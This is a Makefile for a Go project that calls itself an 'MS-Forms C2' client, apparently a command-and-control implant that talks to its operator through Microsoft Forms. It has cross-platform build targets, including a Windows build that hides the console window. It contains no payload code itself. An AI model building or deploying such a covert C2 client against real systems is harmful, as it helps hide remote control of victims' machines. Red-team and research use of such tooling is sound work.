.PHONY: help build build-windows build-linux build-macos clean test run

help:
	@echo "MS-Forms C2 - Golang Client"
	@echo ""
	@echo "Available targets:"
	@echo "  build             - Build for current OS"
	@echo "  build-windows     - Build for Windows (x64)"
	@echo "  build-linux       - Build for Linux (x64)"
	@echo "  build-macos       - Build for macOS (x64)"
	@echo "  clean             - Remove built binaries"
	@echo "  run               - Run client (requires FORM_ID)"
	@echo "  test              - Run tests"

build:
	@go build -o bin/client ./cmd/client

build-windows:
	@GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o bin/client.exe ./cmd/client

build-linux:
	@GOOS=linux GOARCH=amd64 go build -o bin/client-linux ./cmd/client

build-macos:
	@GOOS=darwin GOARCH=amd64 go build -o bin/client-macos ./cmd/client

clean:
	@rm -rf bin/

run:
	@go run ./cmd/client -form-id $(FORM_ID)

test:
	@go test -v ./...

install-deps:
	@go mod download
	@go mod tidy
